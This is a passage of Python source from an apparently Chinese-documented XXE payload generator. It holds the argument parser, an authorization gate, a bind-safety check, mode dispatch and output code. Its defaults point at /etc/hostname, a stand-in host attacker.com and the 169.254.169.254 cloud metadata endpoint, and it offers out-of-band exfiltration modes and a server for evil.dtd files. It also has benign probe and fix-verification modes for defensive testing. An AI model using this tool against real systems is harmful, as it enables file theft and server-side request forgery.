    parser.add_argument("--target-file", "-f", default="/etc/hostname",
                        help="要测试读取的目标文件")
    parser.add_argument("--attacker-url", "-a", default="http://attacker.com",
                        help="DTD/Canary 服务器地址")
    parser.add_argument("--ssrf-url", "-s",
                        default="http://169.254.169.254/latest/meta-data/",
                        help="SSRF 目标 URL")
    parser.add_argument("--oob-mode", default="plain",
                        choices=["plain", "b64", "ftp", "auto"],
                        help="OOB 外带编码模式（auto 按目标平台自动选 b64/ftp）")
    parser.add_argument("--probe", action="store_true",
                        help="无害模式: 全部 file/ssrf 目标替换为 canary")
    parser.add_argument("--output", "-o", default="./xxe_payloads_v2",
                        help="输出目录 (对全部模式生效)")
    parser.add_argument("--json", action="store_true", help="JSON 输出")
    parser.add_argument("--no-save", action="store_true", help="不保存到文件")
    parser.add_argument("--verify-artifacts", action="store_true",
                        help="生成后自动校验产物合法性与 XML 良构性")
    parser.add_argument("--dtd-db", help="自定义本地 DTD 素材 JSON 文件")

    parser.add_argument("--serve", action="store_true", help="启动 DTD/Canary Server")
    parser.add_argument("--bind", default="127.0.0.1",
                        help="绑定地址 (默认 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8080, help="端口")
    parser.add_argument("--log-file", default="callbacks.jsonl",
                        help="回连日志文件")
    parser.add_argument("--public-host",
                        help="回调服务器的对外地址 (host[:port])，目标走代理时必填")
    parser.add_argument("--ftp-host",
                        help="FTP 外带接收端 (host[:port]，默认端口 21)。"
                             "--oob-mode ftp / auto(Java) 时 oob.dtd 的外带地址，"
                             "独立于回调服务器的 HTTP 端口")
    parser.add_argument("--canary-map",
                        help="canary_map.json 路径（--serve 时载入，"
                             "回调日志会直接回填 payload 名）")

    parser.add_argument("--i-have-authorization", "-Y", action="store_true",
                        help="确认已获得目标系统的书面测试授权")
    parser.add_argument("--yes", action="store_true",
                        help="跳过交互式确认 (用于 --serve 绑定非回环地址)")

    return parser


def check_authorization(args) -> bool:
    """
    [P3-4] 授权闸门：攻击面模式必须显式确认已获授权。
    --probe 与 fingerprint / verify_fix 属于无害验证，不需要。
    """
    if args.probe or args.mode in BENIGN_MODES:
        return True
    if args.i_have_authorization:
        return True

    print("""
[!] 该模式会生成真实的 XXE 攻击 Payload（读取目标文件 / 触发 SSRF）。

    使用前必须确保已获得目标系统的书面测试授权。
    若仅做防御验证，请改用以下无害模式（无需授权确认）:
        --mode fingerprint
        --mode verify_fix
        --mode <任意> --probe

    确认已获授权后，追加参数重跑:
        --i-have-authorization  (简写 -Y)
""")
    return False


def check_bind_safety(args) -> bool:
    """[P2-3] 默认 127.0.0.1；绑定非回环地址需显式确认。"""
    if args.bind in ("127.0.0.1", "::1", "localhost"):
        return True
    if args.yes or args.i_have_authorization:
        return True
    print(f"""
[!] 回调服务器将绑定到 {args.bind}（非回环地址）。

    这会让 DTD / Canary 服务暴露在网络中，其中 /evil.dtd 与 /oob.dtd
    是攻击载荷分发端点。请确认你处于隔离的授权测试网络中。

    确认后追加参数重跑:
        --yes    或    -Y
""")
    return False


def payloads_to_jsonable(payloads: List[Dict]) -> List[Dict]:
    """[P2-4] 补全白名单，避免 --json 输出丢字段。"""
    keys = ("name", "technique", "description", "payload", "evil_dtd",
            "injection_fragment", "injection_point", "content_type", "method",
            "headers", "file_ext", "ooxml_kind", "ooxml_injection",
            "odf_kind", "odf_mimetype", "odf_injection", "epub",
            "binary_carrier", "target_component", "benign", "interpretation",
            "expected_when_fixed", "expected_when_vulnerable", "requirements",
            "dtd_path", "note", "base64_saml", "soap_mtom")
    return [{k: p.get(k) for k in keys if p.get(k) is not None} for p in payloads]


def generate_by_mode(g: XXEPayloadGenerator, mode: str) -> Dict[str, List[Dict]]:
    mapping = {
        "basic": lambda: {"basic": [g.generate_basic_file_entity_payload()]},
        "local_dtd": lambda: {"local_dtd": g.generate_local_dtd_payload()},
        "error_based": lambda: {"error_based": [g.generate_error_based_payload()]},
        "blind_ssrf": lambda: {"blind_ssrf": g.generate_blind_ssrf_payload()},
        "xinclude": lambda: {"xinclude": g.generate_xinclude_payload()},
        "schema_ssrf": lambda: {"schema_ssrf": g.generate_schema_ssrf_payload()},
        "soap": lambda: {"soap": g.generate_soap_payloads()},
        "svg": lambda: {"svg": g.generate_svg_payloads()},
        "office": lambda: {"office_ooxml": g.generate_office_payloads()},
        "odf": lambda: {"office_odf": g.generate_odf_payloads()},
        "epub": lambda: {"epub": g.generate_epub_payloads()},
        "xmp_image": lambda: {"xmp_image": g.generate_xmp_image_payloads()},
        "misc_xml": lambda: {"misc_xml": g.generate_misc_xml_payloads()},
        "saml": lambda: {"saml": g.generate_saml_payloads()},
        "rss_atom": lambda: {"rss_atom": g.generate_rss_atom_payloads()},
        "webdav": lambda: {"webdav": g.generate_webdav_payloads()},
        "spring_xml": lambda: {"spring_xml": g.generate_spring_xml_payloads()},
        "fingerprint": lambda: {"fingerprint": g.generate_fingerprint_payloads()},
        "verify_fix": g.generate_verify_fix_suite,
        "scenario_auto": g.generate_scenario_payloads,
        "auto": g.generate_all_payloads,
    }
    if mode not in mapping:
        raise ValueError(f"Unsupported mode: {mode}")
    return mapping[mode]()


def print_payloads(results: Dict[str, List[Dict]]):
    print(ReportHelper.generate_text_report(results))

    for category, payloads in results.items():
        if not payloads:
            continue
        print(f"\n{'#' * 80}\n# CATEGORY: {category}\n{'#' * 80}")

        for i, p in enumerate(payloads, 1):
            print(f"\n{'=' * 80}")
            print(f"[{i}] {p.get('name', 'unnamed')}")
            print(f"技术: {p.get('technique', 'N/A')}")
            print(f"说明: {p.get('description', '')}")

            for label, key in (("注入点", "injection_point"),
                               ("HTTP Method", "method"),
                               ("Content-Type", "content_type")):
                if p.get(key):
                    print(f"{label}: {p[key]}")

            if p.get("target_component"):
                print(f"投递组件: {', '.join(p['target_component'])}")
            if p.get("headers"):
                print("建议 Headers:")
                print(json.dumps(p["headers"], ensure_ascii=False, indent=2))
            if p.get("interpretation"):
                print("结果判读:")
                for k, v in p["interpretation"].items():
                    print(f"  - {k}: {v}")

            if (p.get("ooxml_kind") or p.get("odf_kind") or p.get("epub")
                    or p.get("binary_carrier")):
                print("[说明] 控制台展示的是内部 XML; 保存时会生成合法的容器/图片文件。")

            print("\n--- Payload (内部 XML) ---")
            print(textwrap.indent(p.get("payload", ""), "  "))

            if p.get("evil_dtd"):
                print("\n--- evil.dtd ---")
                print(textwrap.indent(p["evil_dtd"], "  "))
            if p.get("base64_saml"):
                print("\n--- Base64 SAMLResponse ---")
                print(textwrap.indent(p["base64_saml"], "  "))

            if p.get("requirements"):
                print("\n前提条件:")
                for r in p["requirements"]:
                    print(f"  - {r}")


def main():
    global _JSON_MODE

    parser = build_arg_parser()
    args = parser.parse_args()
    _JSON_MODE = args.json

    if args.list:
        list_modes()
        return

    # [v2.3][P3] --json 时 stdout 只允许出现最终 JSON，横幅省略
    if not args.json:
        print_banner()

    if args.serve:
        if not check_bind_safety(args):
            return
        start_dtd_server(port=args.port, target_file=args.target_file,
                         bind=args.bind, log_file=args.log_file,
                         target_os=args.os, oob_mode=args.oob_mode,
                         public_host=args.public_host,
                         canary_map=load_canary_map(args.canary_map),
                         target_platform=args.platform,
                         benign=args.probe,        # [v2.3][P1]
                         ftp_host=args.ftp_host)   # [v2.3][P2]
        return

    if not args.mode:
        parser.print_help()
        emit("\n[!] 请指定 --mode，或使用 --list 查看可用模式。")
        return

    if not check_authorization(args):
        return

    extra_dtd = load_custom_dtd_db(args.dtd_db)

    generator = XXEPayloadGenerator(
        target_file=args.target_file,
        attacker_url=args.attacker_url,
        ssrf_url=args.ssrf_url,
        target_os=args.os,
        platform=args.platform,
        benign=args.probe,
        oob_mode=args.oob_mode,
        dtd_db=(LOCAL_DTD_DATABASE + extra_dtd) if extra_dtd else None,
    )

    # [A3] canary 依赖真实回调地址。用默认的 attacker.com 必然零回连，
    #      而"零回连"在本工具中等同于"已修复" —— 必须拦下来。
    if args.attacker_url == "http://attacker.com" and (
            args.mode in BENIGN_MODES or args.probe):
        emit("""
[!] 未指定 --attacker-url，canary 当前指向 attacker.com。

    您将收不到任何回连，而"零回连"在本工具中等同于"已修复" ——
    这会产生完全错误的结论。请用 -a 指定您自己的回调地址后重跑，例如:

        python xxe_v2.3.py --mode verify_fix -a http://YOUR_IP:8080 -o ./verify
""")
        if args.mode == "verify_fix" and not args.yes:
            emit("[!] verify_fix 依赖真实回调，已中止。"
                 "如确需跳过请追加 --yes。")
            return

    try:
        results = generate_by_mode(generator, args.mode)
    except ValueError as e:
        emit(f"[!] {e}")
        return

    if not any(results.values()):
        emit(f"[!] 没有生成任何 Payload。mode={args.mode}, "
             f"platform={args.platform}, os={args.os}, probe={args.probe}")
        return

    # [A5] 用一个 benign 参照组统计各类探针总数，供覆盖矩阵算真实百分比
    reference: Dict[str, int] = {}
    if args.mode == "verify_fix":
        ref_gen = XXEPayloadGenerator(
            target_file=args.target_file, attacker_url=args.attacker_url,
            ssrf_url=args.ssrf_url, target_os=args.os, platform=args.platform,
            benign=True, oob_mode=args.oob_mode,
            dtd_db=(LOCAL_DTD_DATABASE + extra_dtd) if extra_dtd else None)
        reference = {c: len(v)
                     for c, v in ref_gen.generate_all_payloads().items()}

    if args.json:
        # [v2.3][P3] stdout 唯一的内容就是这份 JSON
        print(json.dumps(
            {c: payloads_to_jsonable(ps) for c, ps in results.items()},
            ensure_ascii=False, indent=2))
    else:
        print_payloads(results)

    if args.mode == "verify_fix":
        emit(ReportHelper.generate_coverage_report(
            results, ALL_CATEGORIES, reference))

    # [P1-1] 落盘不再受模式白名单限制
    # [v2.2] 也不再被 --json 跳过（v2.1 的 --json 分支直接 return，
    #        导致 --mode verify_fix --json -o ./verify 拿到一个空目录）
    if not args.no_save:
        save_payloads_to_files(results, args.output,
                               verify=args.verify_artifacts,
                               canary_map=generator.canary_map)
    else:
        emit("\n[*] 已指定 --no-save，跳过落盘。如需保存请去掉该参数。")


if __name__ == "__main__":
    main()
